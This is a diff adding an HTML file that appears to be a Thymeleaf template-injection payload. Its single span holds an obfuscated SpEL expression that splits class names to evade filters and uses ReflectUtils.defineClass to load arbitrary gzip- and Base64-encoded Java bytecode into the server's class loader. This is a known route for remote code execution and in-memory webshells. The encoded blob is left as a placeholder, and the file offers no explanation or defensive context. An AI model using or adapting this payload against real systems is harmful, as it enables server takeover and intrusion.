@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<p>
+    <span th:text="${T(com.fasterxml.jackson.databind.util.ClassUtil).createInstance(&quot;&quot;.getClass().forName(&#39;org.spr&#39;+&#39;ingframework.expression.spel.standard.SpelExpressionParser&#39;),true).parseExpression(&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Test',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('gzip + Base64')))),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))&quot;).getValue()}">[NOT EVALUATED]</span>
+
+</p>
+</body>
+</html>
